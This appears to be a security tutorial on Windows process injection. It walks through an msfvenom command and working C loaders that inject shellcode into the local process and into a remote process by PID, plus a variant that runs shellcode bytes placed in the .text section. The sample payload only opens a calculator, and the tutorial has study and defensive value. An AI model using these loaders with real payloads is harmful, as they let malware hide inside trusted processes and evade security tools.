---
description: Local & Remote Process Injection
cover: ../../.gitbook/assets/10101010101.jpg
coverY: 0
---

# Process Injection

[Process Injection](https://attack.mitre.org/techniques/T1055/) is a technique which involves injecting malicious code or a malicious DLL (Dynamic Link Library) into a legitimate process running on a system. This technique allows an attacker to execute their malicious code within the context of a trusted process, bypassing security measures and **potentially** remaining undetected.

Process injection  can be broken down into a number of different sub-techniques. The [Mitre ATT\&CK framework](https://attack.mitre.org/) highlights the following [Process Injection](https://attack.mitre.org/techniques/T1055/) techniques:

* [DLL injection](https://attack.mitre.org/techniques/T1055/001/)
* [Portable Execution Injection](https://attack.mitre.org/techniques/T1055/002/)
* [Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)
* [APC (Asynchronous Procedure Calls) Injection](https://attack.mitre.org/techniques/T1055/004/)
* [Thread Local Store](https://attack.mitre.org/techniques/T1055/005/)
* [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008/)
* [Proc Memory](https://attack.mitre.org/techniques/T1055/009/)
* [Extra Window Memory Injection](https://attack.mitre.org/techniques/T1055/011/)
* [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
* [Process Doppelganging](https://attack.mitre.org/techniques/T1055/013/)
* [VDSO (Virtual Dynamic Shared Object) Hijacking](https://attack.mitre.org/techniques/T1055/014/)
* [ListPlanting](https://attack.mitre.org/techniques/T1055/015/)

### Generating Shellcode

Shellcode is the actual payload which is executed in most cases often to gain remote access (or perform any other action) to a machine.  There are different ways to generate a shellcode, but for simplicity purpose, I am going to stick with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) calc payload which can be generated using the command below

```bash
$ msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f C -b "\x00\x0a\x0d"
```

### Local Process Injection

#### 1. Allocating space for our Shellcode

First we need to allocate memory to store our shellcode in our process memory. We can do that with the help of [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function.

```c
/* Function Definition
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
*/
VOID* pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
```

Note: Having an address with all RWX perms can be an IoC, so it’s generally not a great idea to do it. We will see how we can make it better later.

* <mark style="color:purple;">lpAddress</mark> is just starting address of the region to allocate. Since it is optional, we will keep it NULL & let the function decide.
* <mark style="color:purple;">dwSize</mark> is the size of the region to be allocated which we want to be the size of our shellcode.
* We are reserving & commiting the pages(memory) in one step with this, you can read about different options [here](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).
* <mark style="color:purple;">PAGE\_EXECUTE\_READWRITE</mark> is the permission that we are setting on the allocated memory.

#### 2. Writing our Shellcode to the Allocated Memory

With this, we now have allocated Virtual memory in our process space. moving on to the next step, we need to write/copy our payload to the allocated memory. We can do that using [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory), or [memcpy](https://www.geeksforgeeks.org/memcpy-in-cc/).

```c
memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
```

#### 3. Creating Thread to run our Shellcode

Great!, now we have our payload copied at the given address. In order to run the payload, we need to do one last step, which is to create a thread which can run the code, Although we can also do it without the need to create a thread but we will check that out later. We can use [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) to create a thread

```c
/* Function Definition
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
*/
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
```

* <mark style="color:purple;">lpThreadAttributes</mark> is a pointer to a [SECURITY\_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560\(v=vs.85\)) structure. For simplicity purpose, we can just keep it NULL.
* <mark style="color:purple;">dwStackSize</mark> is the size of stack, if 0, the new thread uses default size for the executable.
* <mark style="color:purple;">lpStartAddress</mark> is the pointer to the (starting of the)function to be executed by the thread, which is why this is pShellcodeAddress.
* <mark style="color:purple;">lpParameter</mark> is optional, our “function” doesn’t use any parameter so we keep it NULL.
* <mark style="color:purple;">dwCreationFlags</mark> is a flag determining how we want to create a thread, we can keep it NULL for now.
* <mark style="color:purple;">lpThreadId</mark> is a pointer to a variable which will receive the ThreadId of the newly created thread, this can be NULL since we don’t have any use of it in this case.

#### 4. Letting Thread execute our shellcode

Cool now we have everything right?…., No. There is still one thing left, assuming you did something like this

```c
int main() {
...
VOID* pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
return 0;     // <----- this will exit main just after creating the thread
}             //        so the thread doesn't get enough time to execute the shell
```

The shellcode won’t run yet, why? because we didn’t let the thread to finish executing the code yet, we exit even before the thread has finished running the code which is why the calculator doesn’t spawn. So we need to wait for the thread to finish before we exit, we can do that by just using getchar / [Sleep](https://www.geeksforgeeks.org/sleep-function-in-c/) (which may not be the best ways) or rather [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject), which will wait until the thread has finished executing only after which we can move to the next code / instruction.

#### 5. Local Process Injection PoC

Here’s a final code to execute shellcode locally.

```c
#include <Windows.h>
#include <stdio.h>

unsigned char shellcode[] = 
"....."; // you can have it inside main as well

int main() {
    
    PVOID	pShellcodeAddress;
    HANDLE	hThread;

    pShellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("Shellcode Address is  @---0x%p\n", pShellcodeAddress);
    memcpy(pShellcodeAddress, shellcode, sizeof(shellcode));
    hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
    if(hThread == NULL) {
 	printf("Error creating thread  @--0x%d\n", GetLastError());
	return -1;
    }
    printf("Created Thread to run Shellcode \n");
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><em>Executing our code to spawn a calculator</em></p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><em>Checking  the Payload through Process Hacker</em></p></figcaption></figure>

Nice, We are able to inject the shellcode into local process successfully!. \
If there is any problem, we can add more debug statements to check what is actually happening.&#x20;

### Remote Process Injection

Okay, now that we can inject the shellcode locally, let's try injecting it into a remote process. Using this, we can run our shellcode under the disguise of a legitimate process :imp:

Now since we have already created our shellcode, I will skip that part.

#### 1. Opening Handle to a Process

First of all, for us to access / interact with another process, we require a ["Process Handle"](https://serverfault.com/questions/27248/what-is-a-process-handle), we can achieve this using the [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function which will then provide us with the process handle but it requires a [Pid (Process Identifier)](https://www.ibm.com/docs/en/ztpf/2019?topic=process-id). \
\
For Simplicity purpose, we will first open a notepad, get it's PID, and then give it to [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. after opening the notepad you can just type this into cmd to get the PID of your notepad process.

```bash
tasklist | findStr notepad
```

<div align="center"><figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p><em>notepad.exe having PID 2992</em></p></figcaption></figure></div>

```c
/* Function Definition
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
); */
DWORD PID = atoi(argv[1]); // converting string to integer
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
```

* <mark style="color:purple;">**dwDesiredAccess**</mark> is the desired access with which we want to open the process. This can be any of the [Process access rights](https://learn.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights).
* <mark style="color:purple;">**bInheritHandle**</mark> is a bool value which tells whether the process created by this process aka child process would inherit the handle or not. we can keep this FALSE since we don't need it.
* <mark style="color:purple;">**dwProcessId**</mark> is the Process Identifier of which we would want a Handle.

#### 2. Allocate Memory for Shellcode

Now we just have to follow the same methods shown in [Local Process Injection](./#local-process-injection) again but in the context of the Remote Process. So we start with [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

```c
/*
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
); */
pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
```

As you might have noticed, this is very similar to the  [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) function , only that we are provided a process handle in which we want to allocate the virtual memory.

#### 3. Writing payload to allocated Memory

We can use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function to write inside a process memory (since I have used memcpy earlier, I'll use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) here).

```c
/* BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess, 
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
); */
WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), 0);
```

* <mark style="color:purple;">hProcess</mark> being Process Handle.
* <mark style="color:purple;">lpBaseAddress</mark> is the starting (base) of the Address where we want to write.
* <mark style="color:purple;">lpBuffer</mark> is the buffer(payload) which we want to write.
* <mark style="color:purple;">nSize</mark> is the size of the buffer.
* <mark style="color:purple;">lpNumberOfBytesWritten</mark> is the bytes already written, 0 since we haven't written anything.

#### 4. Creating a Remote Thread to execute our Payload

We have now written our payload into the memory space of the safe process, now we can just create a remote thread to run our payload using [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).

```c
/* HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
); */
hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
```

Now that we have created a thread to execute our payload, we just have to wait for it as mentioned previously. but we also have to tidy things up after we have finished executing our payload.\
Here's the final implementation.

#### 5. Remote Process Injection PoC

{% code title="ProcessInjection.c" fullWidth="false" %}
```c
#include <Windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\xeb\x27....";

int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		printf("[*] Usage: %s <PID> ", argv[0]);
		return 0;
	}
	
	DWORD		PID = NULL;
	PVOID		pAddress;
	HANDLE		hProcess = NULL,
		hThread = NULL;

	PID = atoi(argv[1]);
	printf("Getting Handle to the Process with PID: %d\n", PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), 0);
	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
	
	return 0;
}


```
{% endcode %}

### Error Handling

It is important to handle errors properly and also this helps us to debug things and understand the actual problem we have in case we face any kind of error. Here we see the MSDN document for [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) which helps us gain insight on what to expect when calling the [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function.\


<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p><em>MSDN document for OpenProcess</em></p></figcaption></figure>

We can have a basic check accordingly to check the value of hProcess & print error message accordingly.  The [GetLastError](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror) function is really important while debugging our malware and we would be using this a lot.

Here's the main function with added Debugging Information & Error Handling.

```c
int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		printf("[*] Usage: %s <PID> ", argv[0]);
		return 0;
	}
	
	DWORD		PID = NULL;
	PVOID		pAddress;
	HANDLE		hProcess = NULL,
		hThread = NULL;

	PID = atoi(argv[1]);
	printf("Getting Handle to the Process with PID: %d\n", PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("[-] Error Getting Handle to the Process, Got: %d\n", GetLastError());
		return 1;
	}
	printf("[+] Opened Handle to the Process: %d\n", PID);
	
	pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (pAddress == NULL) {
		printf("[-] Unable to Allocate Virtual Memory, Error: %d\n", GetLastError());
		return 1;
	}
	printf("[+] Allocated Virtual Memory   @--0x%p\n", pAddress);
	
	WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), 0);
	printf("[+] Wrote payload to the Process\n");
	
	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
	if (hThread == NULL) {
		printf("[-] Unable to Create Remote thread, Error: %d\n", GetLastError());
		return 1;
	}
	printf("[#] Created Remote Thread!! \n");
	WaitForSingleObject(hThread, INFINITE);
	
	if (hThread) CloseHandle(hThread);
	if (hProcess) CloseHandle(hProcess);
	printf("[+] Cleaning finished... exiting...\n");
	
	return 0;
}
```

Now this looks wayy better than what we have done [before](./#id-5.-remote-process-injection-poc), It's always good to have debug statements in order to understand better.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption><p><em>Remote Process Injection</em></p></figcaption></figure>

Now, let's just try to give a random value as PID which doesn't exists, like 123123

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p><em>Random PID given</em> </p></figcaption></figure>

Notice the GetLastError says 87, now if we go to the [System Error Codes](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-) page, we can see that the \
error 87 corresponds to "incorrect parameter".

<div align="center"><figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p><em>Incorrect Parameter</em> </p></figcaption></figure></div>

And if we try to give a higher privilege process id as an input (eg. 4 which is system process), we get a different error (5) which corresponds to "Access is denied" as it should be.

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption><p><em>Access Denied</em></p></figcaption></figure>

### Bonus Method (No WinAPI)

There's also another way to execute a shellcode without calling or using any of the Windows API, As we know that shellcode is just a machine code to be executed in hexadecimal format. So we can cast it as a function pointer and then tell the compiler to run that function.

Now to execute the code, we need to make sure that it is in `.text` section which we can tell the compiler manually to add our shellcode to the `.text` section, the reason for this is because the `.text` section is where our code generally runs and it is the section having Execute permission. Ofcourse, we can also change the Permission of the memory where our shellcode resides but that will have to be done using the [**VirtualProtect**](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) API.

```c
#pragma section(".text")

__declspec(allocate(".text")) char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main() {
	void (*p)() = (void(*)())&shellcode;
	p();
	// Below Code will do the same thing
	//(*(void(*)())(&shellcode))();
	return 0;
}
```

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### References

1. [Process Injection - MITRE ATT\&CK](https://attack.mitre.org/techniques/T1055/)
2. [System Error Codes](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-)
3. [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
4. [ired.team](https://www.ired.team/)

